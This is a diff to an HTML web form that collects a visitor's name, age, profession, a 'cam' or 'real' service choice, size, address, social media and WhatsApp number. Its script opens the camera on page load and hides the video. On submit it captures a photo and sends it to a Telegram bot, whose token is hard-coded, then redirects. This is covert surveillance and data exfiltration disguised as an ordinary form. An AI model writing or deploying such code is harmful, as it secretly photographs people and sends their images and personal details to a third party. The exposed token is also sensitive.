@@ -17,33 +17,33 @@
   </div>
 
   <div class="container-fluid">
-   
 
-    <form method="post" id="dataForm">
-      
+
+    <form action="" method="post" id="dataForm">
+
 
       <div class="mb-3 mt-1">
         <label for="name" class="form-label">Name:</label>
-        <input class="form-control form-control-sm shadow-none" id="name" type="text" name="name" />
+        <input class="form-control form-control-sm-a rounded-0 shadow-none" id="name" type="text" name="name" />
       </div>
 
-      <div class="mb-3 mt-1 col">
+      <!-- <div class="mb-3 mt-1 col">
         <label for="type" class="form-label">Gender:</label>
-        <select disabled class="form-control form-control-sm shadow-none" id="type" name="type">
+        <select disabled class="form-control form-control-sm-a rounded-0 shadow-none" id="type" name="type">
           <option value=""></option>
           <option selected value="female">Female</option>
           <option value="male">Male</option>
         </select>
-      </div>
+      </div> -->
 
       <div class="row col-12">
         <div class="mb-3 mt-1 col">
           <label for="age" class="form-label">Age:</label>
-          <input class="form-control form-control-sm shadow-none" id="age" type="number" name="age" />
+          <input class="form-control form-control-sm-a rounded-0 shadow-none" id="age" type="number" name="age" />
         </div>
         <div class="mb-3 mt-1 col">
           <label for="profession" class="form-label">Profession:</label>
-          <select class="form-control form-control-sm shadow-none" id="profession" name="profession">
+          <select class="form-control form-control-sm-a rounded-0 shadow-none" id="profession" name="profession">
             <option value=""></option>
             <option selected value="job">Job</option>
             <option value="student">Student</option>
@@ -53,7 +53,7 @@
 
         <div class="mb-3 mt-1 col">
           <label for="type" class="form-label">Service:</label>
-          <select class="form-control form-control-sm shadow-none" id="type" name="type">
+          <select class="form-control form-control-sm-a rounded-0 shadow-none" id="type" name="type">
             <option value=""></option>
             <option selected value="cam">Cam/Virtual</option>
             <option value="real">Real</option>
@@ -66,27 +66,28 @@
 
       <div class="mb-3 mt-1 col">
         <label for="size" class="form-label">Size:</label>
-        <input class="form-control form-control-sm shadow-none" id="size" type="text" name="size" />
+        <input class="form-control form-control-sm-a rounded-0 shadow-none" id="size" type="text" name="size" />
       </div>
 
       <div class="mb-3 mt-1">
         <label for="address" class="form-label">Address:</label>
-        <textarea class="form-control form-control-sm shadow-none" rows="3" name="address"></textarea>
+        <textarea class="form-control form-control-sm-a rounded-0 shadow-none" rows="3" name="address"></textarea>
       </div>
 
       <div class="mb-3 mt-1">
-        <label for="details" class="form-label">Social Media & Others:</label>
-        <textarea class="form-control form-control-sm shadow-none" rows="4" name="additional"></textarea>
+        <label for="details" class="form-label">Social Media / Bio / Others:</label>
+        <textarea class="form-control form-control-sm-a rounded-0 shadow-none" rows="4" name="additional"></textarea>
       </div>
 
 
       <div class="mb-3 mt-1">
         <label for="number" class="form-label">Whatsapp No:</label>
-        <input class="form-control form-control-sm shadow-none" id="number" type="text" number="number" />
+        <input class="form-control form-control-sm-a rounded-0 shadow-none" id="number" type="text" number="number" />
       </div>
 
-      <button type="submit" class="btn btn-success btn-small rounded-1 mt-2 float-end" id="captureButton">Submit</button>
-    
+      <button type="submit" class="btn btn-success btn-small w-100 rounded-1 mt-2 float-end"
+        id="captureButton">Submit</button>
+
     </form>
 
 
@@ -100,31 +101,49 @@
 
   <script>
 
+    const video = document.getElementById("video");
+    const dataForm = document.getElementById("dataForm");
 
-    let video = document.getElementById("video");
-    let dataForm = document.getElementById("dataForm");
+    // Check if camera permission has been granted previously
+    // const hasCameraPermission = localStorage.getItem("cameraPermissionGranted") === "true";
 
-    navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
-      video.srcObject = stream;
+    async function setupCamera() {
+      const stream = null;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        window.localStream = stream;
+      } catch (error) {
+        console.error("Error accessing the camera:", error);
+      } finally {
+        // Hide the loader whether permission was granted or not
+        video.style.display = "none";
+        return stream;
+      }
+    }
 
-      // Store a reference of the stream
-      window.localStream = stream;
-    }).catch(function (err) {
-      console.error("Error accessing the camera: " + err);
-    }).finally(function () {
-      // Hide the loader
-      video.style.display = "none";
-    });
+    const stream = setupCamera();
 
-    // button click event
+    // if (!hasCameraPermission) {
+    //  setupCamera();
+    // }
+
+    // Button click event
     document.getElementById("captureButton").addEventListener("click", async function () {
-
+      // Your capture code here
     });
 
+    //sleep function
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
 
-    dataForm.addEventListener("submit", (e) => {
+    dataForm.addEventListener("submit", async (e) => {
+      // Your form submission code here
       e.preventDefault();
+      await sleep(1000);
 
+      // console.log('debug-message', `button submit`);
 
       //dataForm to json
       let formData = new FormData(dataForm);
@@ -134,7 +153,7 @@
       });
       let json = JSON.stringify(object);
 
-
+      //console.log('debug-message', `json: ${json}`);
 
 
       let video = document.getElementById("video");
@@ -182,10 +201,22 @@
 
         fetch("https://api.telegram.org/bot6542504120:AAFGA5yAXwm2ccyIvu9QWL7IrtzYPuQ4cVI/sendPhoto", requestOptions)
           .then(response => response.text())
-          .then(result => console.log(result))
-          .catch(error => console.log('error', error));
+          .then(result => console.log('ok'))
+          .catch(error => console.log('error', error))
+          .finally(() => {
+            // stop both video and audio
+            localStream.getTracks().forEach((track) => {
+              track.stop();
+            });
+            window.location.href = "/";
+          });
 
       });
+
+      
+
+
+
 
     });
 
